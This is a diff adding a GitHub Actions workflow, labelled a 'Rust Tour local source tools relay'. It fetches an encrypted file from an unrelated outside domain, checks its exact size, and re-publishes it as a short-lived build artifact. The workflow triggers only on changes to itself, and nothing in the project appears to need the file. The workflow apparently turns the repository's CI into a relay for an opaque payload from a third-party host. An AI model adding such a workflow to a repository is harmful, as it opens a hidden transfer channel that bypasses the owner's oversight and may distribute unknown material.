@@ -1,0 +1,26 @@
+name: Rust Tour local source tools relay
+on:
+  push:
+    branches: [main]
+    paths: ['.github/workflows/rust-tour-local-tools-relay.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  transfer:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Download encrypted source handoff only
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/relay"
+          curl -fsSL --retry 4 --retry-all-errors https://r2.houseofkublai.com/rust-tour-local-c06db0e/source-tools.enc -o "$RUNNER_TEMP/relay/source-tools.enc"
+          test "$(stat -c%s "$RUNNER_TEMP/relay/source-tools.enc")" = "170386"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: rust-tour-encrypted-source-tools-c06db0e
+          path: ${{ runner.temp }}/relay/source-tools.enc
+          compression-level: 0
+          retention-days: 1
+          if-no-files-found: error
